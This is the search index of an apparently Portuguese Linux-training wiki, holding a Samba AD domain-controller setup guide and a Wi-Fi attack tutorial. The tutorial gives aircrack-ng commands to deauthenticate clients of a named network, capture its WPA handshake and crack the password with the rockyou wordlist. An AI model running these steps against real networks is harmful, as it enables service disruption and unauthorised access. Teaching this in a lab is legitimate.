{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83d\udc27 Bem-vindo \u00e0 Comunidade Officinas","text":"<p>\ud83d\udcda  Este \u00e9 o portal de conhecimento t\u00e9cnico e colaborativo da Comunidade Officinas, voltado ao aprendizado, pr\u00e1tica e documenta\u00e7\u00e3o de tecnologias voltadas ao uso de Linux, servidores, infraestrutura de rede e muito mais.</p>"},{"location":"#objetivos","title":"\ud83d\udc49 Objetivos","text":"<ul> <li> <p><code>RESPONSABILIDADE SOCIAL</code> - Promover o Software Livre com todo o entusiasmo que vem da cria\u00e7\u00e3o e edi\u00e7\u00e3o de arquivos e os resultados pr\u00e1ticos desse trabalho, proporcionando liberdade, transpar\u00eancia, estabilidade e seguran\u00e7a ao parque de TI regional.</p> </li> <li> <p><code>INCLUS\u00c3O DIGITAL</code> - A possibilidade de crescimento comunit\u00e1rio aliado a capacidade de impactar pessoas, \u00e1 que percebam novas possibilidades no futuro.</p> </li> <li> <p><code>FORMA\u00c7\u00c3O PROFISSIONAL</code> - Possibilitar a forma\u00e7\u00e3o de novos gestores de TI \u00e1 m\u00e9dio e longo prazo.</p> </li> <li> <p><code>TRANSPAR\u00caNCIA</code> - Incentivando a ado\u00e7\u00e3o de ferramentas com c\u00f3digo fonte audit\u00e1vel, para uso na m\u00e1quina p\u00fablica ou privada.</p> </li> </ul> <p>\ud83d\udcd8 Abaixo voc\u00ea encontrar\u00e1 conte\u00fados organizados em m\u00f3dulos, tutoriais pr\u00e1ticos, configura\u00e7\u00f5es de servi\u00e7os e materiais de apoio.</p>"},{"location":"#visao-geral","title":"\ud83c\udf10 Vis\u00e3o Geral","text":"<ul> <li>Vis\u00e3o Geral</li> </ul>"},{"location":"#servidores","title":"\ud83d\udee0\ufe0f Servidores","text":"<ul> <li>DC1 Compilado</li> <li>DC1 Binarios</li> <li>DC1 Rocky</li> <li>DC2 Rocky</li> <li>DHCP Server</li> <li>DNS Server</li> <li>Fileserver Debian binario</li> <li>Fileserver Rocky</li> <li>Fileserver Rocky Linux</li> <li>Firewall Server</li> <li>MkDocs Server</li> <li>NFS Server</li> <li>RAID</li> </ul>"},{"location":"#sistema-operacional","title":"\ud83d\udcdf Sistema Operacional","text":"<ul> <li>OpenSUSE</li> <li>Systemd</li> <li>FHS</li> </ul>"},{"location":"#modulos","title":"\ud83d\udd29 M\u00f3dulos","text":"<ul> <li>M\u00f3dulo 103.1 - Aula 00</li> <li>M\u00f3dulo 103.1 - Aula 01</li> <li>M\u00f3dulo 103.1 - Aula 02</li> <li>M\u00f3dulo 103.1 - Aula 03</li> <li>M\u00f3dulo 103.1 - Aula 04</li> <li>M\u00f3dulo 103.1 - Aula 05</li> <li>M\u00f3dulo 103.2 - Aula 01</li> </ul>"},{"location":"#permissoes-e-usuarios","title":"\ud83d\udd12 Permiss\u00f5es e Usu\u00e1rios","text":"<ul> <li>Permiss\u00f5es Linux - Parte 01</li> <li>Permiss\u00f5es Linux - Parte 02</li> <li>Usu\u00e1rios e Grupos - Parte 01</li> <li>Usu\u00e1rios e Grupos - Parte 02</li> </ul>"},{"location":"#outros","title":"\ud83d\udd27 Outros","text":"<ul> <li>Universo *NIX</li> <li>Pentester</li> </ul>"},{"location":"#propostas","title":"\ud83e\uddd1\u200d\ud83d\udcbb Propostas","text":"<ul> <li> <p><code>LABORAT\u00d3RIO</code> pr\u00e1tico com computadores, Sistema operacional, aplica\u00e7\u00f5es e arquivos de configura\u00e7\u00e3o, no melhor estilo \"m\u00e3o na massa\".</p> </li> <li> <p><code>DOCUMENTA\u00c7\u00c3O</code> te\u00f3rica de apoio, atualizada, formatada e disponibilizada para estudos dentro ou fora da sala.</p> </li> <li> <p><code>INSTRUTOR</code> dispon\u00edvel \u00e1 turma de alunos, para subirmos juntos cada degrau dessa tremenda escalada!</p> </li> <li> <p><code>SOFTWARE LIVRE</code> aliando os conceitos de divers\u00e3o e responsabilidade.</p> </li> </ul> <p></p> <p>Visite a p\u00e1gina do Linux Professional Institute aqui.</p> <p>Baixe uma c\u00f3pia do Debian Linux \ud83d\udc27</p> <p></p> <p>Imagem ISO</p> <p>    O SENHOR \u00e9 quem d\u00e1 sabedoria e o entendimento procede dEle! (Prov 2:6) \ud83d\udca1 </p> <p> </p>"},{"location":"Aircrack-NG/","title":"Ataque de Deauth ou Dissocia\u00e7\u00e3o de Redes WI-FI","text":"<p>Redes cabeadas se autenticam com 3 Way Handshake, eqto redes de Wi-fi autenticam com 4 Way Handshake.</p> <p>\ud83d\udee1\ufe0f Como funciona um ataque de desautentica\u00e7\u00e3o?</p> <p>Os atacantes que desejam realizar um ataque de desautentica\u00e7\u00e3o geralmente usam dispositivos habilitados para Wi-Fi e software especializado. O processo b\u00e1sico envolve o seguinte:</p> <pre><code>- Captura de tr\u00e1fego Wi-Fi: O atacante inicia a captura de tr\u00e1fego da rede Wi-Fi alvo usando ferramentas como um sniffer de pacotes.\n- Identifica\u00e7\u00e3o de dispositivos-alvo: O atacante identifica os dispositivos que desejam desconectar da rede.\n- Envio de pacotes de desautentica\u00e7\u00e3o: Usando o endere\u00e7o MAC dos dispositivos-alvo, o atacante envia pacotes de desautentica\u00e7\u00e3o, for\u00e7ando os dispositivos a se desconectarem da rede.\n- Repeti\u00e7\u00e3o cont\u00ednua: O atacante pode repetir esse processo para manter os dispositivos desconectados da rede.\n</code></pre> <p>\ud83c\udfaf Objetivos de um ataque de desautentica\u00e7\u00e3o de Wi-Fi</p> <p>Os atacantes realizam ataques de desautentica\u00e7\u00e3o de Wi-Fi por v\u00e1rias raz\u00f5es, incluindo:</p> <pre><code>- Interrup\u00e7\u00e3o da conectividade: Desconectar dispositivos da rede pode causar interrup\u00e7\u00f5es significativas nas opera\u00e7\u00f5es normais, afetando a produtividade e o acesso \u00e0 Internet.\n- Espionagem: O ataque pode ser usado como uma t\u00e1tica para espionar o tr\u00e1fego de rede dos dispositivos-alvo enquanto eles tentam se reconectar \u00e0 rede.\n- Amea\u00e7as cibern\u00e9ticas: Em alguns casos, os ataques de desautentica\u00e7\u00e3o podem ser o primeiro passo para invas\u00f5es mais graves, como ataques de for\u00e7a bruta a senhas.\n</code></pre>"},{"location":"Aircrack-NG/#instala-a-ferramenta-de-monitoramento","title":"Instala a ferramenta de monitoramento:","text":"<pre><code>sudo apt install aircrack-ng\n</code></pre>"},{"location":"Aircrack-NG/#valida-o-nome-da-sua-placa-de-rede-wi-fi","title":"Valida o nome da sua placa de rede wi-fi:","text":"<pre><code>ip -c addr\n</code></pre>"},{"location":"Aircrack-NG/#valida-possiveis-conflitos-de-hardware-antes-de-iniciar-os-processos","title":"Valida poss\u00edveis conflitos de hardware antes de iniciar os processos:","text":"<pre><code>sudo airmon-ng check kill\n</code></pre>"},{"location":"Aircrack-NG/#coloca-a-placa-de-rede-wi-fi-em-modo-monitoramento","title":"Coloca a placa de rede wi-fi em modo monitoramento:","text":"<pre><code>sudo airmon-ng start wlan0\n</code></pre>"},{"location":"Aircrack-NG/#valida-o-novo-nome-da-sua-placa-de-captura-de-redes-wi-fi","title":"Valida o novo nome da sua placa de captura de redes wi-fi:","text":"<pre><code>ip -c addr\n</code></pre> <pre><code>sudo airmon-ng\n</code></pre>"},{"location":"Aircrack-NG/#inicia-o-scan-de-todas-as-redes-proximas-aparecerao-diversas-redes","title":"Inicia o scan de todas as redes pr\u00f3ximas (aparecer\u00e3o diversas redes):","text":"<pre><code>sudo airodump-ng wlan0mon\n</code></pre>"},{"location":"Aircrack-NG/#encerra-o-scan-das-redes-apos-escolher-o-alvo","title":"Encerra o scan das redes ap\u00f3s escolher o alvo:","text":"<pre><code>ctrl+c\n</code></pre>"},{"location":"Aircrack-NG/#anote-o-essid-nome-da-rede-alvo-bem-como-o-bssid-mac-e-tbem-o-canal-ch","title":"Anote o ESSID (Nome) da rede alvo, bem como o BSSID (MAC) e tb\u00e9m o CANAL (CH):","text":"<pre><code>Condominio_Flores_II\n</code></pre> <pre><code>64:D1:54:09:EE:3E\n</code></pre> <pre><code>4\n</code></pre>"},{"location":"Aircrack-NG/#podemos-validar-apenas-a-rede-alvo-se-preferir","title":"Podemos validar apenas a rede alvo, se preferir:","text":"<pre><code>sudo airodump-ng wlan0mon -d 64:D1:54:09:EE:3E\n</code></pre>"},{"location":"Aircrack-NG/#posso-me-conectar-a-rede-wi-fi-alvo-se-for-um-laboratorio-usando-um-celular","title":"Posso me conectar \u00e1 rede wi-fi alvo, se for um laborat\u00f3rio, usando um celular.","text":""},{"location":"Aircrack-NG/#vai-constar-o-novo-cliente-com-dados-do-aparelho-definidos-em-station","title":"Vai constar o novo cliente, com dados do aparelho, definidos em STATION.","text":"<p><code>TERMINAL 01</code> - VAMOS INICIAR A CAPTURA DOS PACOTES</p>"},{"location":"Aircrack-NG/#subo-o-comando-de-captura-de-pacotes-da-rede-alvo-e-salvo-o-arquivo-de-captura","title":"Subo o comando de captura de pacotes da rede alvo e salvo o arquivo de captura:","text":"<p><pre><code>sudo airodump-ng -w capturados -c 2 --bssid 64:D1:54:09:EE:3E wlan0mon\n</code></pre> OU <pre><code>sudo airodump-ng -w capturados --channel 2 --essid Condominio_Flores_II wlan0mon\n</code></pre></p> <p>\u00c1 partir daqui, eu aguardo algum dispositivo se conectar para realizar a captura do 4 Way Hand Shake.... OU</p> <p><code>TERMINAL 02</code> - VAMOS INICIAR O ATAQUE DE DESAUTENTICA\u00c7\u00c3O</p>"},{"location":"Aircrack-NG/#inicia-o-ataque-ao-roteador-alvo-todos-os-clientes-caem-durante-o-ataque","title":"Inicia o ataque ao roteador alvo (todos os clientes caem durante o ataque):","text":"<pre><code>sudo aireplay-ng --deauth 0 -a 64:D1:54:09:EE:3E wlan0mon\n</code></pre> <p>Posso tb\u00e9m, desautenticar apenas um dispositivo espec\u00edfico</p> <pre><code>sudo aireplay-ng --deauth 5 -a 64:D1:54:09:EE:3E -c 28:6C:07:6F:F9:53 wlan0mon\n</code></pre>"},{"location":"Aircrack-NG/#ao-tentar-re-conexao-os-clientes-entregam-o-handshake-de-4-vias-no-terminal-01","title":"Ao tentar re-conex\u00e3o, os clientes entregam o handshake de 4 vias no TERMINAL 01:","text":"<pre><code>[WPA handshake]: 64:D1:54:09:EE:3E\n</code></pre>"},{"location":"Aircrack-NG/#podemos-encerrar-a-captura-no-terminal-01","title":"Podemos encerrar a captura no TERMINAL 01","text":"<pre><code>ctrl+c\n</code></pre>"},{"location":"Aircrack-NG/#podemos-encerrar-o-ataque-no-terminal-02","title":"Podemos encerrar o ataque no TERMINAL 02","text":"<pre><code>ctrl+c\n</code></pre>"},{"location":"Aircrack-NG/#ate-esse-ponto-apenas-teriamos-um-ataque-de-negacao-de-servico-ddos-mas-nos-salvamos-um-arquivo-com-informacoes-capturadoscap-e-vamos-usa-lo","title":"At\u00e9 esse ponto apenas ter\u00edamos um ataque de Nega\u00e7\u00e3o de servi\u00e7o (DDOS), MAS, n\u00f3s salvamos um arquivo com informa\u00e7\u00f5es (capturados.cap) e vamos us\u00e1-lo","text":""},{"location":"Aircrack-NG/#instale-o-wireshark-e-abra-o-arquivo-de-captura-filtrando-mensagens-criptografadas-do-tipo-eapol","title":"Instale o Wireshark e abra o arquivo de captura, filtrando mensagens criptografadas, do tipo EAPOL:","text":"<pre><code>sudo apt install wireshark\n</code></pre> <pre><code>wireshark capturados.cap\n</code></pre> <p>OU</p>"},{"location":"Aircrack-NG/#baixe-sua-wordlist-para-quebrar-a-senha-capturada-usando-o-aircrack-ng","title":"Baixe sua wordlist para quebrar a senha capturada usando o aircrack-ng:","text":"<pre><code>wget https://github.com/zacheller/rockyou.git\n</code></pre> <pre><code>wc -l rockyou.txt\n</code></pre>"},{"location":"Aircrack-NG/#focaremos-apenas-em-senhas-que-contenham-de-8-a-64-caracteres-diminuindo-o-tempo-de-conjuncoes","title":"Focaremos apenas em senhas que contenham de 8 a 64 caracteres, diminuindo o tempo de conjun\u00e7\u00f5es:","text":"<pre><code>sudo grep -x '.\\{8,64\\}' rockyou.txt &gt; wparockyou.txt\n</code></pre> <pre><code>wc -l wparockyou.txt\n</code></pre> <pre><code>aircrack-ng capturados.cap -w /home/usuariox/wordlists/rockyou.txt\n</code></pre>"},{"location":"Aircrack-NG/#o-resultado-deve-ser-uma-mensagem","title":"O resultado deve ser uma mensagem:","text":"<pre><code>KEY FOUNF [ P@ssword123 ]\n</code></pre>"},{"location":"Aircrack-NG/#retira-a-placa-de-rede-wi-fi-do-modo-monitoramento","title":"Retira a placa de rede wi-fi do modo monitoramento:","text":"<pre><code>airmon-ng stop wlan0mon\n</code></pre>"},{"location":"Aircrack-NG/#restaura-sua-placa-de-rede-para-navegacao","title":"Restaura sua placa de rede para navega\u00e7\u00e3o:","text":"<pre><code>systemctl restart NetworkManager\n</code></pre>"},{"location":"Aircrack-NG/#alternativa-de-varredura-de-rede-pelo-terminal","title":"Alternativa de varredura de rede pelo terminal:","text":"<p><pre><code>nmcli device wifi list \n</code></pre> <pre><code>N-USE = rede que voc\u00ea est\u00e1 usando\nBSSID = endere\u00e7o do roteador\nSSID = nome da rede\nMODE = infra (?)\nCHAN = canal que est\u00e1 sendo utilizado pelo roteador\nRATE = taxa de transfer\u00eancia\nSIGNAL = intensidade do sinal em %\nBARS = intensidade do sinal em barras\nSECURITY = protocolos de seguran\u00e7a do roteador\n</code></pre></p>"},{"location":"DC1_Rocky/","title":"\ud83d\udcc1 DC1 Rocky","text":""},{"location":"DC1_Rocky/#controlador-de-dominio-primario-no-rocky-linux-9","title":"Controlador de Dom\u00ednio Prim\u00e1rio no Rocky Linux 9","text":"<p>Update do sistema:</p> <pre><code>yum update -y &amp;&amp; yum upgrade -y \n</code></pre> <p>Instalar o editor de texto nano:</p> <pre><code>dnf install nano\n</code></pre> <p>Verificar sua configura\u00e7\u00e3o de rede e DNS, bem como nome de dom\u00ednio. Uma das formas: Abra um terminal e chame o nmtui:</p> <pre><code> nmtui\n</code></pre> <p>Selecione Editar uma conex\u00e3o. Ent\u00e3o a op\u00e7\u00e3o Editar.</p> <p>Verificar ou alterar seu endere\u00e7o ip e m\u00e1scara de sub-rede e seu Gateway. </p> <p>Na op\u00e7\u00e3o Servidor DNS: inserir o DNS desejado. N\u00e3o esquecer de inserir em Dom\u00ednios de pesquisa: seu.dom\u00ednio.</p> <p>V\u00e1 at\u00e9 o fim e selecione OK para salvar.</p> <p>Selecione Voltar e ent\u00e3o no menu: selecionar a op\u00e7\u00e3o: Definir nome de m\u00e1quina do sistema: dc1.seu.dominio. </p> <p>Agora selecione a op\u00e7\u00e3o: OK para salvar. Novamente selecione OK. Deve retornar para o terminal.</p> <p>Editar o arquivo /etc/host:</p> <pre><code>nano /etc/hosts\n</code></pre> <p>Inserir os dados referentes ao seu servidor:</p> <pre><code>127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n# inserir os dados de seu server\n10.1.1.31    dc1                            dc1.seu.dominio\n</code></pre> <p>Onde: 10.1.1.31 = IP de seu pr\u00f3prio AD-DC (controlador de dom\u00ednio)</p> <p>dc1 = nome simplificado do seu host de seu controlador de dom\u00ednio</p> <p>dc1.seu.dom\u00ednio = nome do host + seu.dom\u00ednio </p> <p>Veririficar se existe algum processo do samba rodando:</p> <pre><code># ps ax | egrep \"samba|smbd|nmbd|winbindd\"\n</code></pre> <p>Remover qualquer config file que houver, checando com o comando:</p> <pre><code># smbd -b | grep \"CONFIGFILE\"\n   CONFIGFILE: /usr/local/samba/etc/samba/smb.conf\n</code></pre> <p>Remover todos arquivos de data base que houver. Como: .tdb e .ldb:  </p> <pre><code># smbd -b | egrep \"LOCKDIR|STATEDIR|CACHEDIR|PRIVATE_DIR\"\n  LOCKDIR: /usr/local/samba/var/lock/\n  STATEDIR: /usr/local/samba/var/locks/\n  CACHEDIR: /usr/local/samba/var/cache/\n  PRIVATE_DIR: /usr/local/samba/private/\n</code></pre> <p>Remover o arquivo /etc/krb5.conf se houver, com o comando:</p> <pre><code>rm /etc/krb5.conf\n</code></pre> <p>Instalar plugins e habilitar o reposit\u00f3rio PowerTools com os comandos abaixo:</p> <pre><code>dnf install dnf-plugins-core\ndnf install epel-release\ndnf config-manager --set-enabled powertools\ndnf update\n</code></pre> <p>Checar os reposit\u00f3rios adicionados com o comando:</p> <pre><code>dnf repolist\n</code></pre> <p>O resultado deve ser algo como:</p> <pre><code>id do repo nome do repo\nappstream Rocky Linux 8 - AppStream\nbaseos Rocky Linux 8 - BaseOS\ndevel Rocky Linux 8 - Devel WARNING! FOR BUILDROOT AND KOJI USE\n\n- epel Extra Packages for Enterprise Linux 8 - x86_64\n- extras Rocky Linux 8 - Extras\n- powertools Rocky Linux 8 - PowerTools\n</code></pre>"},{"location":"DC1_Rocky/#setar-a-hora-local-ntp","title":"Setar a hora local (ntp):","text":"<p>Listando as op\u00e7\u00f5es de hora local.</p> <pre><code>timedatectl list-timezones\n</code></pre> <p>Para setar o timezone desejado, usar o comando:\u00a0</p> <pre><code>timedatectl set-timezone America/Sao_Paulo \n</code></pre> <p>Verificando o timezone setado:</p> <pre><code>timedatectl\n</code></pre> <p>O resultado deve parecer como abaixo:</p> <pre><code>Local time: qua 2023-04-12 09:04:22 -03\n           Universal time: qua 2023-04-12 12:04:22 UTC\n                 RTC time: qua 2023-04-12 12:00:16\n                Time zone: America/Sao_Paulo (-03, -0300)\nSystem clock synchronized: yes\n              NTP service: active\n          RTC in local TZ: no \n</code></pre> <p>Instalar as depend\u00eancias dos pacotes. Fazer um arquivo do tipo script execut\u00e1vel e inserir os comandos:</p> <pre><code>nano depende.sh\n</code></pre> <p>Inserir os comandos:</p> <pre><code>set -xueo pipefail\n\nyum update -y\nyum install -y dnf-plugins-core\nyum install -y epel-release\n\nyum -v repolist all\nyum config-manager --set-enabled PowerTools -y || \\\n    yum config-manager --set-enabled powertools -y\nyum config-manager --set-enabled Devel -y || \\\n    yum config-manager --set-enabled devel -y\nyum update -y\n\nyum install -y \\\n    --setopt=install_weak_deps=False \\\n    \"@Development Tools\" \\\n    acl \\\n    attr \\\n    autoconf \\\n    avahi-devel \\\n    bind-utils \\\n    binutils \\\n    bison \\\n    ccache \\\n    chrpath \\\n    cups-devel \\\n    curl \\\n    dbus-devel \\\n    docbook-dtds \\\n    docbook-style-xsl \\\n    flex \\\n    gawk \\\n    gcc \\\n    gdb \\\n    git \\\n    glib2-devel \\\n    glibc-common \\\n    glibc-langpack-en \\\n    glusterfs-api-devel \\\n    glusterfs-devel \\\n    gnutls-devel \\\n    gpgme-devel \\\n    gzip \\\n    hostname \\\n    htop \\\n    jansson-devel \\\n    keyutils-libs-devel \\\n    krb5-devel \\\n    krb5-server \\\n    libacl-devel \\\n    libarchive-devel \\\n    libattr-devel \\\n    libblkid-devel \\\n    libbsd-devel \\\n    libcap-devel \\\n    libcephfs-devel \\\n    libicu-devel \\\n    libnsl2-devel \\\n    libpcap-devel \\\n    libtasn1-devel \\\n    libtasn1-tools \\\n    libtirpc-devel \\\n    libunwind-devel \\\n    libuuid-devel \\\n    libxslt \\\n    lmdb \\\n    lmdb-devel \\\n    make \\\n    mingw64-gcc \\\n    ncurses-devel \\\n    openldap-devel \\\n    pam-devel \\\n    patch \\\n    perl \\\n    perl-Archive-Tar \\\n    perl-ExtUtils-MakeMaker \\\n    perl-JSON \\\n    perl-Parse-Yapp \\\n    perl-Test-Simple \\\n    perl-generators \\\n    perl-interpreter \\\n    pkgconfig \\\n    popt-devel \\\n    procps-ng \\\n    psmisc \\\n    python3 \\\n    python3-cryptography \\\n    python3-devel \\\n    python3-dns \\\n    python3-gpg \\\n    python3-iso8601 \\\n    python3-libsemanage \\\n    python3-markdown \\\n    python3-policycoreutils \\\n    python3-pyasn1 \\\n    python3-setproctitle \\\n    quota-devel \\\n    readline-devel \\\n    redhat-lsb \\\n    rng-tools \\\n    rpcgen \\\n    rpcsvc-proto-devel \\\n    rsync \\\n    sed \\\n    sudo \\\n    systemd-devel \\\n    tar \\\n    tree \\\n    wget \\\n    which \\\n    xfsprogs-devel \\\n    yum-utils \\\n    zlib-devel \\\n    nano \\\n    krb5-workstation\n\nyum clean all \n</code></pre> <p>Salvar o arquivo</p> <p>Transformar o arquivo em um execut\u00e1vel com o comando:</p> <pre><code>chmod +x depende.sh\n</code></pre> <p>Executar o aquivo com o comando:</p> <pre><code>./depende.sh\n</code></pre> <p>Fazer download da \u00faltima vers\u00e3o do samba ou da vers\u00e3o desejada: </p> <pre><code>wget https://download.samba.org/pub/samba/stable/samba-4.18.0.tar.gz\n</code></pre> <p>Descompactar o arquivo baixado:</p> <pre><code>tar -zxvf samba-nome-arquivo\n</code></pre> <p>Mudar para o diret\u00f3rio onde foi descompactado:</p> <pre><code>cd samba-nome-arquivo/\n</code></pre> <p>Compilar o samba para o arquivo de configura\u00e7\u00e3o ficar em: /etc/samba/smb.conf com o comando:</p> <pre><code>./configure --sysconfdir=/etc/samba/\n</code></pre> <p>Aguarde o processo finalizar.</p> <p>E ent\u00e3o fa\u00e7a os comandos make e make install:</p> <pre><code>make &amp;&amp; make install\n</code></pre> <p>No diret\u00f3rio /root edite o arquivo .bash_profile</p> <pre><code>nano .bash_profile\n</code></pre> <p>E inserir a linha:</p> <pre><code># User specific environment and startup programs\nPATH=$PATH:$HOME/bin\n\n# ESTA LINHA\nPATH=/usr/local/samba/bin/:/usr/local/samba/sbin/:$PATH\n\nexport PATH\n</code></pre> <p>Salvar o arquivo</p>"},{"location":"DC1_Rocky/#criar-um-arquivo-de-servico-systemd","title":"Criar um arquivo de servi\u00e7o systemd.","text":"<p>Executar os comandos:</p> <pre><code># systemctl mask smbd nmbd winbind\n# systemctl disable smbd nmbd winbind\n</code></pre> <p>Criar o arquivo em: <code>/etc/systemd/system/samba-ad-dc.service</code></p> <pre><code>nano /etc/systemd/system/samba-ad-dc.service\n</code></pre> <p>Com as seguintes linhas:</p> <pre><code>[Unit]\nDescription=Samba Active Directory Domain Controller\nAfter=network.target remote-fs.target nss-lookup.target\n\n[Service]\nType=forking\nExecStart=/usr/local/samba/sbin/samba -D\nPIDFile=/usr/local/samba/var/run/samba.pid\nExecReload=/bin/kill -HUP $MAINPID\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Salvar o arquivo</p> <p>Recarrregar o <code>systemd</code> com o comando:</p> <pre><code>systemctl daemon-reload\n</code></pre> <p>Habilitar o <code>samba-ad-dc</code> para iniciar no boot do sistema:</p> <pre><code>systemctl enable samba-ad-dc\n</code></pre> <p>Verificar em qual dispositivo de rede est\u00e1 sua conex\u00e3o:</p> <pre><code>ip a\n</code></pre> <p>O resultado deve ser parecido com isso:</p> <pre><code>2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether de:1e:07:63:42:51 brd ff:ff:ff:ff:ff:ff\n    altname enp0s18\n    inet 10.1.1.31/24 brd 10.1.1.255 scope global noprefixroute ens18\n</code></pre> <p>OBS: o ens18 neste caso \u00e9 seu dispositivo</p> <p>Reestart o sistema:</p> <pre><code>reboot\n</code></pre> <p>Vamos Provisionar o Samba. Abrir um terminal:</p> <pre><code>samba-tool domain provision --use-rfc2307 --interactive --option=\"interfaces= lo ens18\" --option=\"bind interfaces only=yes\"\n</code></pre> <p>Responda as quest\u00f5es referente sua configura\u00e7\u00e3o:</p> <pre><code>Realm: SEU.Dominio \nDomain [AD]: Dom\u00ednio  \nServer Role (dc, member, standalone) [dc]: dc \nDNS backend (SAMBA_INTERNAL, BIND9_FLATFILE, BIND9_DLZ, NONE) SAMBA_INTERNAL]: SAMBA_INTERNAL \nDNS forwarder IP address (write 'none' to disable forwarding) [SEU_IP_DNS]:IP DNS  \nAdministrator password: escolher uma senha  \nRetype password: repetir a mesma senha\n</code></pre> <p>OBS: Guarde a senha de provisionamento</p> <p>Configurar Kerberos:</p> <pre><code>cp /usr/local/samba/private/krb5.conf /etc/krb5.conf\n</code></pre> <p>Reestart o servi\u00e7o do samba-ad com o comando:</p> <pre><code>systemctl restart samba-ad-dc\n</code></pre> <p>Para parar servi\u00e7o fazer o comando:</p> <pre><code>systemctl stop samba-ad-dc\n</code></pre> <p>Se necessitar desabilitar o servi\u00e7o, utilizar o comando:</p> <pre><code>systemctl disable samba-ad-dc\n</code></pre> <p>Verificar a vers\u00e3o do samba:</p> <pre><code>smbclient --version\n</code></pre> <p>Testar o samba com o comando:</p> <pre><code>smbclient -L localhost -U%\n</code></pre> <p>Verificar o DNS (_ldap):</p> <pre><code>host -t SRV _ldap._tcp.seu.dominio\n</code></pre> <p>Verificar _kerberos:</p> <pre><code> host -t SRV _kerberos._udp.seu.dominio.\n</code></pre> <p>A Grava\u00e7\u00e3o A</p> <pre><code>host -t A seu.dominio\n</code></pre> <p>Verificando o Kerberos</p> <pre><code>kinit Administrator\nPassword for Administrator@SEU.DOMINIO:\nWarning: Your password will expire in 41 days on Tue 22 Sep 2020 03:41:22 PM IST\n</code></pre> <p>Listar o cache dos tickets</p> <pre><code>klist\n</code></pre> <p>Com a resposta parecida com essa:</p> <pre><code>Valid starting       Expires              Service principal\n13/04/2023 13:54:57  13/04/2023 23:54:57  krbtgt/SEU.DOMINIO@SEU.DOMINIO\n    renew until 14/04/2023 13:54:50\n</code></pre>"},{"location":"DC1_Rocky/#configurar-o-firewall","title":"Configurar o Firewall","text":"<p>Adicionar servi\u00e7os:</p> <pre><code>firewall-cmd --add-service={dns,ldap,ldaps,kerberos}\n</code></pre> <p>Adicionar portas:</p> <pre><code>firewall-cmd --add-port={389/udp,135/tcp,135/udp,138/udp,138/tcp,137/tcp,137/udp,139/udp,139/tcp,445/tcp,445/udp,3268/udp,3268/tcp,3269/tcp,3269/udp,49152/tcp}\n</code></pre> <p>Recarregar o Firewall:</p> <pre><code>firewall-cmd --reload\n</code></pre>"},{"location":"DC1_Rocky/#para-criar-um-segundo-dc-clique-aqui","title":"Para Criar um Segundo DC, clique aqui","text":""},{"location":"DC1_Rocky/#replicacao-do-sysvol-backup-do-ad-para-um-dc2","title":"Replica\u00e7\u00e3o do SysVol (backup do AD) para um DC2","text":"<p>Gerar uma chave SSH-Keygen no DC1 com o comando:</p> <pre><code>ssh-keygen -t rsa\n</code></pre> <p>Algumas perguntas ser\u00e3o feitas:</p> <p>Onde salvar o arquvo de chave, que neste caso: (/root/.ssh/id_rsa) teclar enter</p> <p>Entre com uma senha (ou apenas digite enter para ficar sem senha), teclar enter</p> <p>Entre com a senha novamente: teclar enter</p> <p>A sa\u00edda ser\u00e1 algo como:</p> <pre><code>Your identification has been saved in /root/.ssh/id_rsa.\nYour public key has been saved in /root/.ssh/id_rsa.pub.\n</code></pre> <p>Quando a chave for criada, copiar para o servidor que ser\u00e1 o segundo DC2 com o comando:</p> <pre><code>ssh-copy-id user-dc2@IP-Seu-DC2\n</code></pre> <p>Agora pode-se conectar com ssh sem requerer senha de acesso.</p> <p>Conecte-se via ssh em seu DC2 e mude as permiss\u00f5es de acesso para que o usu\u00e1rio do dc2 possa escrever no diret\u00f3rio com o comando:</p> <pre><code>chown root.user-dc2 -R /usr/local/samba/var/locks/sysvol/\n</code></pre> <p>Fazendo o backup do DC1 para o DC2. Para um teste antes, fazer o comando usando a op\u00e7\u00e3o --dry-run para apenas um teste sem altera\u00e7\u00e3o.</p> <pre><code>rsync --dry-run -XAavz --delete-after --progress --stats /usr/local/samba/var/locks/sysvol/ user-dc2@IP-DC2:/usr/local/samba/var/locks/sysvol/\n</code></pre> <p>O comando rsync far\u00e1 uma copia do sysvol de seu DC1 (parte1) para o sysvol de seu DC2 (parte2):</p> <p><code>Parte 1:</code> </p> <p>rsync --dry-run -XAavz  --delete-after --progress --stats /usr/local/samba/var/locks/sysvol/</p> <p><code>Parte 2:</code></p> <p>user-dc2@IP-DC2:/usr/local/samba/var/locks/sysvol/</p> <p>O resultado deve ser algo parecido com:</p> <pre><code>building file list ... \n12 files to consider\n./\nseu.dominio/\nseu.dominio/Policies/\nseu.dominio/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/\nseu.dominio/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI\nseu.dominio/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/\nseu.dominio/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/\nseu.dominio/Policies/{6AC1786C-016F-11D2-945F-00C04FB984F9}/\nseu.dominio/Policies/{6AC1786C-016F-11D2-945F-00C04FB984F9}/GPT.INI\nseu.dominio/Policies/{6AC1786C-016F-11D2-945F-00C04FB984F9}/MACHINE/\nseu.dominio/Policies/{6AC1786C-016F-11D2-945F-00C04FB984F9}/USER/\nseu.dominio/scripts/\n\nNumber of files: 12 (reg: 2, dir: 10)\nNumber of created files: 9 (reg: 2, dir: 7)\nNumber of deleted files: 0\nNumber of regular files transferred: 2\nTotal file size: 40 bytes\nTotal transferred file size: 40 bytes\nLiteral data: 0 bytes\nMatched data: 0 bytes\nFile list size: 0\nFile list generation time: 0.038 seconds\nFile list transfer time: 0.000 seconds\nTotal bytes sent: 2,011\nTotal bytes received: 51\n\nsent 2,011 bytes  received 51 bytes  1,374.67 bytes/sec\ntotal size is 40  speedup is 0.02 **(DRY RUN)**\n</code></pre> <p>Com o resultado positivo, pode-se rodar o comando sem a op\u00e7\u00e3o --dry-run:</p> <pre><code>rsync -XAavz --delete-after --progress --stats /usr/local/samba/var/locks/sysvol/ dc2@IP-DC2:/usr/local/samba/var/locks/sysvol/\n</code></pre> <p>Para automatizar o processo, inserir o comando no crontab. Para aprender mais sobre o crontab clique aqui</p> <p>Adicionar 